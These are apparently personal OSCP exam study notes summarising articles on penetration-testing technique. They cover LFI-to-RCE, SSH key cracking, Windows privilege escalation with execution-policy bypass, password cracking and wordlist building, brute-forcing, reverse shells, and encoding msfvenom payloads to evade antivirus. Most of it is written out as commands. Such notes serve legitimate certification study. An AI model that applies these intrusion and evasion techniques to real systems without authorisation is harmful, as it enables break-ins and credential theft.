Notes on various resources about helpful takeaways for the exam.

##  OSCP Exam Secrets — Avoiding Rabbit Holes and Staying on Track (Part 2)

https://infosecwriteups.com/oscp-exam-secrets-avoiding-rabbit-holes-and-staying-on-track-part-2-c5192aee6ae7

- LFI is good for information disclosure, but also a good vector to RCE via log poisoning or PHP stream wrappers
- Checklist for after finding a private key, id_rsa
	- `ssh -i id_rsa user@TARGET -p PORT -o IdentitiesOnly=yes -o BatchMode=yes -vvv`
	- Check password protection: `ssh-keygen -y -f id_rsa >/dev/null && echo “no passphrase” || echo “passphrase-protected or invalid”`
	- If password protected, use ssh2john and crack
	- If ssh complains about libcrypto or key format, normalize the file: `dos2unix id_rsa` then `vim --clean id_rsa`
- Use RunasCs to switch users on Windows without having access to a GUI https://github.com/antonioCoco/RunasCs
- 
## Beyond the Shell: Advanced Enumeration and Privilege Escalation for OSCP (Part 3)

https://infosecwriteups.com/beyond-the-shell-advanced-enumeration-and-privilege-escalation-for-oscp-part-3-7410d3812d02

- When using a PHP reverse shell with a Windows target, use the PHP Ivan Sincek shell from revshells.com
	- reliable and often gives access as a Service User, which will usually have SeImpersonatePrivilege
- For Windows automated privesc, start with PrivescCheck.ps1 (clean and accurate results) https://github.com/itm4n/PrivescCheck
	- `powershell -ep bypass -c “. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML”`
- Just use john with rockyou for cracking, don't worry about hashcat or other lists
	- If there's an "About Us" page on a target website, use username anarchy / cupp / cewl to generate a custom wordlist
		- `cewl http://testphp.vulnweb.com -w test.txt`
		- `cewl http://testphp.vulnweb.com/artists.php --with-numbers`
	- `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
	- Password protected zips and kbdx files are likely meant to be cracked. Use zip2john or kbdx2john 
- Clock Skew
	- "KRB_AP_ERR_SKEW(Clock skew too great)." when using attacks involving Kerberos
	- Use `ntpdate` or `rdate` on kali system to sync local time to the DC
- AV evasion
	- encode msfvenom payloads with x86/shikata_ga_nai or x64/xor_dynamic with multiple iterations (-i) to change the signature
- FTP/SMB
	- When there is FTP or SMB, check for anon/default creds immediately
	- Try to enumerate/discover usernames. Then use the discovered names to brute force web pages or SSH
	- Try strange file/dir names as usernames/passwords across other systems
- Don't hesitate to revert a machine if something doesn't work
- File transfer basics
	- Linux: 
		- Serve: `python3 -m http.server 80`
		- Download: `curl http://<Kali-IP>/file.bin -o file.bin`
	- Windows: 
		- Serve: `impacket-smbserver`
		- Upload/download from Windows: use `copy`

## Tooling To Help Hunt Down POCs For Vulnerable CVEs Beyond Searchsploit
## searchsploit
`searchsploit -u`

...

### Vulnx

`go install github.com/projectdiscovery/cvemap/cmd/vulnx@latest`

Add to PATH if not present
in bashrc, zsh etc
`export PATH=/home/username/go/bin/:$PATH`

Create account on
 https://cloud.projectdiscovery.io

Auth with API key
`vulnx auth`

```
vulnx version
vulnx healthcheck
```

`vulnx search "form tools 3.1.1"`

`--detailed`

`vulnx id <CVE>`

### Search_Vulns

```
git clone https://github.com/ra1nb0rn/search_vulns
cd ./search_vulns
docker build -t "new-docker-name" .
docker build -t search_vulns .

docker run -it "docker-name" bash
docker run -it search_vulns bash
```

search_vulns.py print help and update

```
python3 ./search_vulns.py -h
./search_vulns.py -h

./search_vulns.py -u
./search_vulns.py --full-update
```

 query search_vulns

`./search_vulns.py -q "CVE-2024-22722"`

## Reddit Comment with more tooling
https://www.reddit.com/r/oscp/comments/1k2axuw/comment/mnucoq6/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button
- ZSH vs FISH use case? Nu shell?
- [Penelope](https://github.com/brightio/penelope) (replacement for nc as a shell handler)
- [bat](https://github.com/sharkdp/bat) (cat replacement)
- [eza](https://github.com/eza-community/eza) (ls replacement)
